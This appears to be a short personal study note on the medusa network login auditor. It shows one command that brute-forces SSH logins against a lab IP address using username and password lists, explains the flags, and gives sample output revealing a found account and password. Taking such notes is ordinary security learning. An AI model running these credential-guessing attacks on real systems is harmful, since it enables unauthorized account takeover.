# 💢 medusa
Tags: #💢
Related to: 
See also: 
Previous: [[Passwd Attacks]]

---
## Description

Parallel Network Login Auditor

## Usage Examples

### Attempt SSH logins

	medusa -h 10.129.189.141 -U users.txt -P passwords.txt -M ssh 10.129.189.141

```
-h [TEXT]    : Target hostname or IP address
-U [FILE]    : File containing usernames to test
-P [FILE]    : File containing passwords to test
-M [TEXT]    : Name of the module to execute (without the .mod extension)


ACCOUNT FOUND: [ssh] Host: 10.129.189.141 User: jimmy Password: n1nj4W4rri0R! [SUCCESS]
```


---
## References
- [[]]